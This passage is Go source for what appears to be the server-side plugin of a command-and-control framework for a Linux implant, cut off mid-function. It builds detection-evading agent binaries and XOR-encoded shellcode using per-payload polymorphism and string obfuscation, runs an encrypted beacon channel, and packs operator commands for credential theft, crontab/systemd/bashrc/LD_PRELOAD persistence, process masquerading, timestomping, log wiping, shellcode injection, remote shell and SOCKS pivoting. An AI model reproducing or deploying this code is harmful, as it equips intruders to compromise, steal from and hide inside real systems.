		stagerTemp, err := os.MkdirTemp("", "ax-linux-stager-*")
		if err != nil {
			_ = os.RemoveAll(tempDir)
			return nil, "", err
		}
		defer os.RemoveAll(stagerTemp)
		defer os.RemoveAll(tempDir)
		return buildLinuxStager(profile.BuilderId, currentDir, stagerTemp, sc, listenerMap, arch, generateConfig)
	default:
		_ = os.RemoveAll(tempDir)
		return nil, "", fmt.Errorf("unknown format: %s", generateConfig.Format)
	}
}

// buildNativeELF — Static ELF binary (no dynamic dependencies)
func (p *PluginAgent) buildNativeELF(profile adaptix.BuildProfile, agentProfiles [][]byte, generateConfig GenerateConfig, currentDir string, tempDir string, arch string) ([]byte, string, error) {
	Filename := "agent_native.elf"
	buildPath := tempDir + "/" + Filename

	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Target: linux/%s (Native C, ELF static)", arch))

	srcDir := NativeSrcDir

	// Step 1: Generate per-payload headers
	configContent := generateNativeConfig(agentProfiles)
	if err := os.WriteFile(tempDir+"/config.h", []byte(configContent), 0644); err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", fmt.Errorf("write config.h: %w", err)
	}
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Config: %d profile(s) embedded", len(agentProfiles)))

	djb2Seed := cryptoRandUint32()
	if err := os.WriteFile(tempDir+"/ApiDefines.h", []byte(generateLinuxApiDefines(djb2Seed)), 0644); err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", fmt.Errorf("write ApiDefines.h: %w", err)
	}
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("DJB2 seed: 0x%08x (per-payload polymorphism)", djb2Seed))

	if err := os.WriteFile(tempDir+"/strings_obf.h", []byte(generateObfStrings()), 0644); err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", fmt.Errorf("write strings_obf.h: %w", err)
	}
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "XOR string obfuscation generated (per-payload key)")

	// Step 2: Compile
	compiler := nativeCompiler(arch)
	cFlags := fmt.Sprintf("%s -I %s -I %s -DDJB2_SEED=%dU", nativeCFlags(arch), tempDir, srcDir, djb2Seed)
	if generateConfig.OpsecEnabled {
		cFlags += " -DOPSEC_ENABLED"
	}
	if generateConfig.OpsecVmExit {
		cFlags += " -DOPSEC_VM_EXIT"
	}

	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Compiling native agent sources (per-payload)...")

	compileSrc := func(srcFile string, outputName string) error {
		outPath := tempDir + "/" + outputName + ".o"
		cmdStr := fmt.Sprintf("%s %s -c %s -o %s", compiler, cFlags, srcFile, outPath)
		return Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, "sh", "-c", cmdStr)
	}

	for _, ofile := range NativeObjFiles {
		if err := compileSrc(srcDir+"/"+ofile+".c", ofile); err != nil {
			_ = os.RemoveAll(tempDir)
			return nil, "", fmt.Errorf("compile %s: %w", ofile, err)
		}
	}
	if err := compileSrc(srcDir+"/main.c", "main"); err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", fmt.Errorf("compile main: %w", err)
	}
	if err := compileMbedtlsObjects(profile, currentDir, tempDir, compiler, cFlags, compileSrc); err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", err
	}
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_SUCCESS, "All sources compiled successfully")

	// Step 3: Link
	var objectFiles []string
	for _, ofile := range NativeObjFiles {
		objectFiles = append(objectFiles, tempDir+"/"+ofile+".o")
	}
	objectFiles = append(objectFiles, tempDir+"/main.o")
	for _, ofile := range NativeMbedtlsObjs {
		objectFiles = append(objectFiles, tempDir+"/"+ofile+".o")
	}
	objectFiles = append(objectFiles, tempDir+"/mbedtls_glue.o")

	// Per-payload polymorphism: unique junk.o + randomized link order
	junkObj, junkErr := p.writeJunkAndCompile(profile, tempDir, compiler, cFlags)
	if junkErr != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", junkErr
	}
	objectFiles = append(objectFiles, junkObj)
	objectFiles = shuffleObjects(objectFiles)

	lFlags := nativeLFlags(arch)
	// -lgcc AFTER objects: bignum's 128-bit division (__udivti3) resolves from
	// libgcc; static libs must follow the objects that reference them.
	linkCmd := fmt.Sprintf("%s %s -o %s %s -lgcc", compiler, lFlags, buildPath, strings.Join(objectFiles, " "))
	if err := Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, "sh", "-c", linkCmd); err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", fmt.Errorf("link: %w", err)
	}

	// Step 4: Read output
	Payload, err := os.ReadFile(buildPath)
	if err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", err
	}
	_ = os.RemoveAll(tempDir)
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Payload size: %d bytes (native ELF %s)", len(Payload), arch))

	return Payload, Filename, nil
}

// buildNativeSO — Shared Object (dlopen-loadable)
func (p *PluginAgent) buildNativeSO(profile adaptix.BuildProfile, agentProfiles [][]byte, generateConfig GenerateConfig, currentDir string, tempDir string, arch string) ([]byte, string, error) {
	Filename := "agent_native.so"
	buildPath := tempDir + "/" + Filename

	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Target: linux/%s (Native C, SO)", arch))

	srcDir := NativeSrcDir

	// Generate per-payload headers
	configContent := generateNativeConfig(agentProfiles)
	if err := os.WriteFile(tempDir+"/config.h", []byte(configContent), 0644); err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", fmt.Errorf("write config.h: %w", err)
	}

	djb2Seed := cryptoRandUint32()
	if err := os.WriteFile(tempDir+"/ApiDefines.h", []byte(generateLinuxApiDefines(djb2Seed)), 0644); err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", fmt.Errorf("write ApiDefines.h: %w", err)
	}
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("DJB2 seed: 0x%08x", djb2Seed))

	if err := os.WriteFile(tempDir+"/strings_obf.h", []byte(generateObfStrings()), 0644); err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", fmt.Errorf("write strings_obf.h: %w", err)
	}

	// Compile with -fPIC -DBUILD_SO
	compiler := nativeCompiler(arch)
	cFlags := fmt.Sprintf("%s -fPIC -DBUILD_SO -I %s -I %s -DDJB2_SEED=%dU", nativeCFlags(arch), tempDir, srcDir, djb2Seed)
	if generateConfig.OpsecEnabled {
		cFlags += " -DOPSEC_ENABLED"
	}
	if generateConfig.OpsecVmExit {
		cFlags += " -DOPSEC_VM_EXIT"
	}

	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Compiling native agent sources (SO mode, per-payload)...")

	compileSrc := func(srcFile string, outputName string) error {
		outPath := tempDir + "/" + outputName + ".o"
		cmdStr := fmt.Sprintf("%s %s -c %s -o %s", compiler, cFlags, srcFile, outPath)
		return Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, "sh", "-c", cmdStr)
	}

	for _, ofile := range NativeObjFiles {
		if err := compileSrc(srcDir+"/"+ofile+".c", ofile); err != nil {
			_ = os.RemoveAll(tempDir)
			return nil, "", fmt.Errorf("compile %s: %w", ofile, err)
		}
	}
	if err := compileSrc(srcDir+"/main.c", "main"); err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", fmt.Errorf("compile main: %w", err)
	}
	if err := compileMbedtlsObjects(profile, currentDir, tempDir, compiler, cFlags, compileSrc); err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", err
	}
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_SUCCESS, "All sources compiled (SO mode)")

	// Link as shared object
	var objectFiles []string
	for _, ofile := range NativeObjFiles {
		objectFiles = append(objectFiles, tempDir+"/"+ofile+".o")
	}
	objectFiles = append(objectFiles, tempDir+"/main.o")
	for _, ofile := range NativeMbedtlsObjs {
		objectFiles = append(objectFiles, tempDir+"/"+ofile+".o")
	}
	objectFiles = append(objectFiles, tempDir+"/mbedtls_glue.o")

	// Per-payload polymorphism: unique junk.o + randomized link order
	junkObj, junkErr := p.writeJunkAndCompile(profile, tempDir, compiler, cFlags)
	if junkErr != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", junkErr
	}
	objectFiles = append(objectFiles, junkObj)
	objectFiles = shuffleObjects(objectFiles)

	linkCmd := fmt.Sprintf("%s -shared -nostdlib -nodefaultlibs -s -Wl,--build-id=none -o %s %s -lgcc", compiler, buildPath, strings.Join(objectFiles, " "))
	if err := Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, "sh", "-c", linkCmd); err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", fmt.Errorf("link SO: %w", err)
	}

	Payload, err := os.ReadFile(buildPath)
	if err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", err
	}
	_ = os.RemoveAll(tempDir)
	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Payload size: %d bytes (native SO %s)", len(Payload), arch))

	return Payload, Filename, nil
}

// buildNativeShellcodeX64 — SO + XOR encoder with x86_64 decoder stub
func (p *PluginAgent) buildNativeShellcodeX64(profile adaptix.BuildProfile, agentProfiles [][]byte, generateConfig GenerateConfig, currentDir string, tempDir string) ([]byte, string, error) {
	Filename := "agent_shellcode.x64.bin"

	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Target: linux/x86_64 (Shellcode, Native C)")

	// Build SO first
	soPayload, _, err := p.buildNativeSO(profile, agentProfiles, generateConfig, currentDir, tempDir, "x86_64")
	if err != nil {
		return nil, "", err
	}

	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("SO size: %d bytes, encoding with XOR...", len(soPayload)))

	shellcode, err := xorEncodeShellcodeX64(soPayload)
	if err != nil {
		return nil, "", fmt.Errorf("xor encode x64: %w", err)
	}

	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_SUCCESS, fmt.Sprintf("Shellcode size: %d bytes (SO %d + stub)", len(shellcode), len(soPayload)))

	return shellcode, Filename, nil
}

// buildNativeShellcodeARM64 — SO + XOR encoder with ARM64 decoder stub
func (p *PluginAgent) buildNativeShellcodeARM64(profile adaptix.BuildProfile, agentProfiles [][]byte, generateConfig GenerateConfig, currentDir string, tempDir string) ([]byte, string, error) {
	Filename := "agent_shellcode.arm64.bin"

	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Target: linux/aarch64 (Shellcode ARM64, Native C)")

	// Build SO first (ARM64)
	soPayload, _, err := p.buildNativeSO(profile, agentProfiles, generateConfig, currentDir, tempDir, "aarch64")
	if err != nil {
		return nil, "", err
	}

	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("SO size: %d bytes, encoding with XOR...", len(soPayload)))

	shellcode, err := xorEncodeShellcodeARM64(soPayload)
	if err != nil {
		return nil, "", fmt.Errorf("xor encode arm64: %w", err)
	}

	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_SUCCESS, fmt.Sprintf("Shellcode size: %d bytes (SO %d + stub)", len(shellcode), len(soPayload)))

	return shellcode, Filename, nil
}

// parseEscapedBytes converts "\x01\x02\xff" to raw bytes
func parseEscapedBytes(escaped []byte) []byte {
	s := string(escaped)
	var result []byte
	for i := 0; i < len(s); {
		if i+3 < len(s) && s[i] == '\\' && s[i+1] == 'x' {
			b, err := strconv.ParseUint(s[i+2:i+4], 16, 8)
			if err == nil {
				result = append(result, byte(b))
				i += 4
				continue
			}
		}
		result = append(result, s[i])
		i++
	}
	return result
}

// generateNativeConfig creates config.h with encrypted profiles as C byte arrays
func generateNativeConfig(agentProfiles [][]byte) string {
	var sb strings.Builder
	sb.WriteString("// Auto-generated — per-payload config\n")
	sb.WriteString("// Do not edit. Regenerated on each build.\n")
	sb.WriteString("#ifndef CONFIG_H\n#define CONFIG_H\n\n")
	sb.WriteString("#include <stdint.h>\n\n")
	sb.WriteString(fmt.Sprintf("#define PROFILE_COUNT %d\n\n", len(agentProfiles)))

	for i, escapedProf := range agentProfiles {
		rawProf := parseEscapedBytes(escapedProf)
		sb.WriteString(fmt.Sprintf("static const uint8_t enc_profile_%d[] = {\n    ", i))
		for j := 0; j < len(rawProf); j++ {
			if j > 0 && j%16 == 0 {
				sb.WriteString("\n    ")
			}
			sb.WriteString(fmt.Sprintf("0x%02x", rawProf[j]))
			if j < len(rawProf)-1 {
				sb.WriteString(", ")
			}
		}
		sb.WriteString("\n};\n")
		sb.WriteString(fmt.Sprintf("static const uint32_t enc_profile_%d_size = %d;\n\n", i, len(rawProf)))
	}

	sb.WriteString("static const uint8_t* enc_profiles[] = {\n")
	for i := range agentProfiles {
		sb.WriteString(fmt.Sprintf("    enc_profile_%d,\n", i))
	}
	sb.WriteString("};\n\n")

	sb.WriteString("static const uint32_t enc_profile_sizes[] = {\n")
	for i := range agentProfiles {
		sb.WriteString(fmt.Sprintf("    enc_profile_%d_size,\n", i))
	}
	sb.WriteString("};\n\n")

	sb.WriteString("#endif // CONFIG_H\n")
	return sb.String()
}

func (p *PluginAgent) CreateAgent(beat []byte) (adaptix.AgentData, adaptix.ExtenderAgent, error) {
	var agentData adaptix.AgentData

	var sessionInfo SessionInfo
	err := msgpack.Unmarshal(beat, &sessionInfo)
	if err != nil {
		return adaptix.AgentData{}, nil, err
	}

	agentData.ACP = int(sessionInfo.Acp)
	agentData.OemCP = int(sessionInfo.Oem)
	agentData.Pid = fmt.Sprintf("%v", sessionInfo.PID)
	agentData.Tid = ""
	agentData.Elevated = sessionInfo.Elevated
	agentData.InternalIP = sessionInfo.Ipaddr

	if sessionInfo.Os == "linux" {
		agentData.Os = adaptix.OS_LINUX
		agentData.OsDesc = sessionInfo.OSVersion
		// Determine arch from OS version string or default
		agentData.Arch = "x86_64"
		if strings.Contains(sessionInfo.OSVersion, "aarch64") || strings.Contains(sessionInfo.OSVersion, "arm64") {
			agentData.Arch = "arm64"
		}
	} else {
		agentData.Os = adaptix.OS_UNKNOWN
		return agentData, nil, errors.New("linux agent received non-linux OS")
	}

	// Session key: 16-byte AES key for LinuxTCP; for GopherTCP the agent
	// appends a 16-byte transport_salt (32 bytes total, AES-GCM + ChaCha20
	// overlay). The salt field must NOT be dropped — otherwise the server
	// falls back to the 16-byte plain-GCM path and every session message
	// fails to decrypt on both ends.
	agentData.SessionKey = sessionInfo.EncryptKey
	if len(sessionInfo.TransportSalt) == 16 {
		agentData.SessionKey = append(append([]byte(nil), sessionInfo.EncryptKey...), sessionInfo.TransportSalt...)
	}
	agentData.Domain = ""
	agentData.Computer = sessionInfo.Host
	agentData.Username = sessionInfo.User
	agentData.Process = sessionInfo.Process

	agentData.Sleep = 0
	agentData.Jitter = 0

	return agentData, &ExtenderAgent{}, nil
}

/// AGENT HANDLER

func (ext *ExtenderAgent) Encrypt(data []byte, key []byte) ([]byte, error) {
	if len(key) >= 32 {
		// Overlay-only: the agent decrypts server responses with
		// gopher_decrypt_nogcm (ChaCha20 overlay, no AES-GCM layer).
		return GopherSessionEncryptNogcm(data, key)
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	_, err = io.ReadFull(rand.Reader, nonce)
	if err != nil {
		return nil, err
	}
	ciphertext := gcm.Seal(nonce, nonce, data, nil)

	return ciphertext, nil
}

func (ext *ExtenderAgent) Decrypt(data []byte, key []byte) ([]byte, error) {
	if len(key) >= 32 {
		// Overlay-only: the agent sends gopher_encrypt_nogcm output.
		return GopherSessionDecryptNogcm(data, key)
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}

	nonce, ciphertext := data[:nonceSize], data[nonceSize:]

	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, err
	}

	return plaintext, nil
}

func (ext *ExtenderAgent) PackTasks(agentData adaptix.AgentData, tasks []adaptix.TaskData) ([]byte, error) {
	var packData []byte

	var objects [][]byte
	var command Command

	for _, taskData := range tasks {
		taskId, err := strconv.ParseUint(taskData.TaskId, 16, 64)
		if err != nil {
			return nil, err
		}

		_ = msgpack.Unmarshal(taskData.Data, &command)
		command.Id = uint(taskId)

		cmd, _ := msgpack.Marshal(command)

		objects = append(objects, cmd)
	}

	message := Message{
		Type:   1,
		Object: objects,
	}

	packData, _ = msgpack.Marshal(message)

	// NOTE: do NOT encrypt here — the core's Agent.PackData calls
	// ext.Encrypt(packed, SessionKey) AFTER PackTasks returns, so the
	// session-layer encryption belongs in Encrypt() only. (Double
	// encryption here broke the whole task channel — see Encrypt below.)

	return packData, nil
}

func (ext *ExtenderAgent) PivotPackData(pivotId string, data []byte) (adaptix.TaskData, error) {
	id, _ := strconv.ParseUint(pivotId, 16, 64)

	// Build Command{code: PIVOT_EXEC, data: {pivot_id, data}}
	innerData, _ := msgpack.Marshal(ParamsPivotExec{
		PivotId: uint32(id),
		Data:    data,
	})
	cmd := Command{
		Code: COMMAND_PIVOT_EXEC,
		Data: innerData,
	}
	packData, _ := msgpack.Marshal(cmd)

	taskData := adaptix.TaskData{
		TaskId: fmt.Sprintf("%08x", mrand.Uint32()),
		Type:   adaptix.TASK_TYPE_PROXY_DATA,
		Data:   packData,
		Sync:   false,
	}

	return taskData, nil
}

func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	var (
		taskData    adaptix.TaskData
		messageData adaptix.ConsoleMessageData
		err         error
	)

	command, ok := args["command"].(string)
	if !ok {
		return taskData, messageData, errors.New("'command' 参数未设置")
	}
	subcommand, _ := args["subcommand"].(string)

	taskData = adaptix.TaskData{
		Type: adaptix.TASK_TYPE_TASK,
		Sync: true,
	}

	messageData = adaptix.ConsoleMessageData{
		Status: adaptix.MESSAGE_INFO,
		Text:   "",
	}
	messageData.Message, _ = args["message"].(string)

	var cmd Command

	switch command {

	case "cat":
		path, err := getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsCat{Path: path})
		cmd = Command{Code: COMMAND_CAT, Data: packerData}

	case "cd":
		path, err := getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsCd{Path: path})
		cmd = Command{Code: COMMAND_CD, Data: packerData}

	case "cp":
		src, err := getStringArg(args, "src")
		if err != nil {
			goto RET
		}
		dst, err := getStringArg(args, "dst")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsCp{Src: src, Dst: dst})
		cmd = Command{Code: COMMAND_CP, Data: packerData}

	case "download":
		path, err := getStringArg(args, "path")
		if err != nil {
			goto RET
		}

		r := make([]byte, 4)
		_, _ = rand.Read(r)
		taskId := binary.BigEndian.Uint32(r)

		taskData.TaskId = fmt.Sprintf("%08x", taskId)

		packerData, _ := msgpack.Marshal(ParamsDownload{Path: path, Task: taskData.TaskId})
		cmd = Command{Code: COMMAND_DOWNLOAD, Data: packerData}

	case "exit":
		cmd = Command{Code: COMMAND_EXIT, Data: nil}

	case "getuid", "whoami":
		// "whoami" 是 Web UI 的 Windows 习惯名；linux 等价物是 getuid
		cmd = Command{Code: COMMAND_GETUID, Data: nil}

	case "env":
		cmd = Command{Code: COMMAND_ENV, Data: nil}

	case "netstat", "ipconfig":
		// "ipconfig" is the Web UI's Windows-style name; map it to the
		// linux network enumeration command.
		cmd = Command{Code: COMMAND_NETSTAT, Data: nil}

	case "mounts", "disks":
		// "disks" is the file-manager alias: mount enumeration doubles as
		// the drive list (parsed into BROWSER_DISKS in ProcessData).
		cmd = Command{Code: COMMAND_MOUNTS, Data: nil}

	case "vnc":
		// The linux agent has no agent-side VNC server; answer locally so
		// the UI shows a clean console message instead of an error.
		taskData.Type = adaptix.TASK_TYPE_LOCAL
		taskData.Message = "VNC 不支持 linux agent"

	case "edr":
		cmd = Command{Code: COMMAND_EDR, Data: nil}

	case "creds":
		credType, _ := getStringArg(args, "type")
		if credType == "" {
			credType = "all"
		}
		packerData, _ := msgpack.Marshal(ParamsCreds{Type: credType})
		cmd = Command{Code: COMMAND_CREDS, Data: packerData}

	case "persist":
		params := ParamsPersist{Action: subcommand}
		switch subcommand {
		case "crontab":
			params.Cmd, _ = getStringArg(args, "cmd")
			params.Schedule, _ = getStringArg(args, "schedule")
		case "systemd":
			params.Name, _ = getStringArg(args, "name")
			params.Cmd, _ = getStringArg(args, "cmd")
		case "bashrc":
			params.Cmd, _ = getStringArg(args, "cmd")
		case "ldpreload":
			params.Path, _ = getStringArg(args, "path")
		case "remove":
			params.Type, _ = getStringArg(args, "type")
			params.Name, _ = getStringArg(args, "name")
		case "status":
			// no extra args
		default:
			err = errors.New("subcommand 必须为：crontab、systemd、bashrc、ldpreload、remove、status")
			goto RET
		}
		packerData, _ := msgpack.Marshal(params)
		cmd = Command{Code: COMMAND_PERSIST, Data: packerData}

	case "container":
		action := subcommand
		if action == "" {
			action = "detect"
		}
		packerData, _ := msgpack.Marshal(ParamsContainer{Action: action})
		cmd = Command{Code: COMMAND_CONTAINER, Data: packerData}

	case "masquerade":
		name, err := getStringArg(args, "name")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsMasquerade{Name: name})
		cmd = Command{Code: COMMAND_MASQUERADE, Data: packerData}

	case "timestomp":
		path, err := getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		timestamp := uint64(0)
		// ★ 同 getFloatArg 头注：addArgInt 的值是 int，原来的 .(float64)
		// 断言拿不到 ⇒ 时间戳**静默变 0**（不报错、结果错）。
		if ts, errTs := getFloatArg(args, "timestamp"); errTs == nil {
			timestamp = uint64(ts)
		}
		packerData, _ := msgpack.Marshal(ParamsTimestomp{Path: path, Timestamp: timestamp})
		cmd = Command{Code: COMMAND_TIMESTOMP, Data: packerData}

	case "cleanlog":
		clPath, _ := getStringArg(args, "path")
		clPairs, _ := getStringArg(args, "pairs")
		packerData, _ := msgpack.Marshal(ParamsCleanlog{Path: clPath, Pairs: clPairs})
		cmd = Command{Code: COMMAND_CLEANLOG, Data: packerData}

	case "inject":
		pidF, err := getFloatArg(args, "pid")
		if err != nil {
			goto RET
		}
		scData, ok := args["shellcode"].([]byte)
		if !ok {
			// Try as base64 string
			scStr, err2 := getStringArg(args, "shellcode")
			if err2 != nil {
				err = errors.New("missing 'shellcode' parameter")
				goto RET
			}
			var err3 error
			scData, err3 = base64.StdEncoding.DecodeString(scStr)
			if err3 != nil {
				err = fmt.Errorf("shellcode 的 base64 编码无效：%v", err3)
				goto RET
			}
		}
		packerData, _ := msgpack.Marshal(ParamsInject{Pid: int(pidF), Shellcode: scData})
		cmd = Command{Code: COMMAND_INJECT, Data: packerData}

	case "migrate":
		cmd = Command{Code: COMMAND_MIGRATE, Data: nil}

	case "job":
		if subcommand == "list" {
			cmd = Command{Code: COMMAND_JOB_LIST, Data: nil}

		} else if subcommand == "kill" {
			jobId, err := getStringArg(args, "task_id")
			if err != nil {
				goto RET
			}
			packerData, _ := msgpack.Marshal(ParamsJobKill{Id: jobId})
			cmd = Command{Code: COMMAND_JOB_KILL, Data: packerData}

		} else {
			err = errors.New("subcommand 必须为 'list' 或 'kill'")
			goto RET
		}

	case "kill":
		pid, err := getFloatArg(args, "pid")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsKill{Pid: int(pid)})
		cmd = Command{Code: COMMAND_KILL, Data: packerData}

	case "ls":
		dir, err := getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsLs{Path: dir})
		cmd = Command{Code: COMMAND_LS, Data: packerData}

	case "mv":
		src, err := getStringArg(args, "src")
		if err != nil {
			goto RET
		}
		dst, err := getStringArg(args, "dst")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsMv{Src: src, Dst: dst})
		cmd = Command{Code: COMMAND_MV, Data: packerData}

	case "mkdir":
		path, err := getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsMkdir{Path: path})
		cmd = Command{Code: COMMAND_MKDIR, Data: packerData}

	case "ps":
		// 进程管理器发送 ps kill <pid>；转换为真正的 kill 任务
		if subcommand == "kill" {
			pid, err := getFloatArg(args, "pid")
			if err != nil {
				goto RET
			}
			packerData, _ := msgpack.Marshal(ParamsKill{Pid: int(pid)})
			cmd = Command{Code: COMMAND_KILL, Data: packerData}
		} else {
			cmd = Command{Code: COMMAND_PS, Data: nil}
		}

	case "pwd":
		cmd = Command{Code: COMMAND_PWD, Data: nil}

	case "rm":
		path, err := getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		packerData, _ := msgpack.Marshal(ParamsRm{Path: path})
		cmd = Command{Code: COMMAND_RM, Data: packerData}

	case "run":
		taskData.Type = adaptix.TASK_TYPE_TASK

		prog, err := getStringArg(args, "program")
		if err != nil {
			goto RET
		}
		runArgs, _ := args["args"].(string)

		r := make([]byte, 4)
		_, _ = rand.Read(r)
		taskId := binary.BigEndian.Uint32(r)

		taskData.TaskId = fmt.Sprintf("%08x", taskId)

		cmdArgs, _ := shlex.Split(runArgs)
		packerData, _ := msgpack.Marshal(ParamsRun{Program: prog, Args: cmdArgs, Task: taskData.TaskId})
		cmd = Command{Code: COMMAND_RUN, Data: packerData}

	case "shell":
		cmdParam, err := getStringArg(args, "cmd")
		if err != nil {
			goto RET
		}

		// Linux: use /bin/sh (most portable)
		r := make([]byte, 4)
		_, _ = rand.Read(r)
		taskId := binary.BigEndian.Uint32(r)
		taskData.TaskId = fmt.Sprintf("%08x", taskId)

		cmdArgs := []string{"-c", cmdParam}
		packerData, _ := msgpack.Marshal(ParamsShell{Program: "/bin/sh", Args: cmdArgs})
		cmd = Command{Code: COMMAND_SHELL, Data: packerData}

	case "socks":
		taskData.Type = adaptix.TASK_TYPE_TUNNEL

		// ★ 同 getFloatArg 头注：addArgInt 的值是 int，原来的 .(float64) 断言拿不到
		// ⇒ ok=false ⇒ **跳过范围校验**，且 port 恒为 0（内核随机挑端口）。
		// 那是最坏的一种失败：不报错、端口却不对。现在拿不到就明说。
		portF, errPort := getFloatArg(args, "port")
		if errPort != nil {
			err = errors.New("参数 port 未设置")
			goto RET
		}
		port := int(portF)
		if port < 1 || port > 65535 {
			err = errors.New("端口必须在 1 到 65535 之间")
			goto RET
		}
		if subcommand == "start" {
			address, err := getStringArg(args, "address")
			if err != nil {
				goto RET
			}

			auth := getBoolArg(args, "-a")
			if auth {
				username, err := getStringArg(args, "username")
				if err != nil {
					goto RET
				}
				password, err := getStringArg(args, "password")
				if err != nil {
					goto RET
				}

				tunnelId, err2 := Ts.TsTunnelCreateSocks5(agentData.Id, "", address, port, true, username, password)
				if err2 != nil {
					err = err2
					goto RET
				}
				taskData.TaskId, err2 = Ts.TsTunnelStart(tunnelId)
				if err2 != nil {
					err = err2
					goto RET
				}

				taskData.Message = fmt.Sprintf("SOCKS5（带认证）服务已启动，端口 %d", port)

			} else {
				tunnelId, err2 := Ts.TsTunnelCreateSocks5(agentData.Id, "", address, port, false, "", "")
				if err2 != nil {
					err = err2
					goto RET
				}
				taskData.TaskId, err2 = Ts.TsTunnelStart(tunnelId)
				if err2 != nil {
					err = err2
					goto RET
				}

				taskData.Message = fmt.Sprintf("SOCKS5 服务已启动，端口 %d", port)
			}
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.ClearText = "\n"

		} else if subcommand == "stop" {
			taskData.Completed = true

			Ts.TsTunnelStopSocks(agentData.Id, port)

			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.Message = "SOCKS5 服务已停止"
			taskData.ClearText = "\n"

		} else {
			err = errors.New("subcommand 必须为 'start' 或 'stop'")
			goto RET
		}

	case "upload":
		remote_path, err := getStringArg(args, "remote_path")
		if err != nil {
			goto RET
		}
		localFile, err := getStringArg(args, "local_file")
		if err != nil {
			goto RET
		}

		fileContent, decodeErr := base64.StdEncoding.DecodeString(localFile)
		if decodeErr != nil {
			err = decodeErr
			goto RET
		}

		zipContent, zipErr := ZipBytes(fileContent, remote_path)
		if zipErr != nil {
			err = zipErr
			goto RET
		}

		chunkSize := 0x500000
		bufferSize := len(zipContent)

		inTaskData := adaptix.TaskData{
			Type:    adaptix.TASK_TYPE_TASK,
			AgentId: agentData.Id,
			Sync:    false,
		}

		for start := 0; start < bufferSize; start += chunkSize {
			fin := start + chunkSize
			finish := false
			if fin >= bufferSize {
				fin = bufferSize
				finish = true
			}

			inPackerData, _ := msgpack.Marshal(ParamsUpload{
				Path:    remote_path,
				Content: zipContent[start:fin],
				Finish:  finish,
			})
			inCmd := Command{Code: COMMAND_UPLOAD, Data: inPackerData}

			if finish {
				cmd = inCmd
				break

			} else {
				inTaskData.Data, _ = msgpack.Marshal(inCmd)
				inTaskData.TaskId = fmt.Sprintf("%08x", mrand.Uint32())

				Ts.TsTaskCreate(agentData.Id, "", "", inTaskData)
			}
		}

	case "link":
		// TCP pivot — connect to child agent
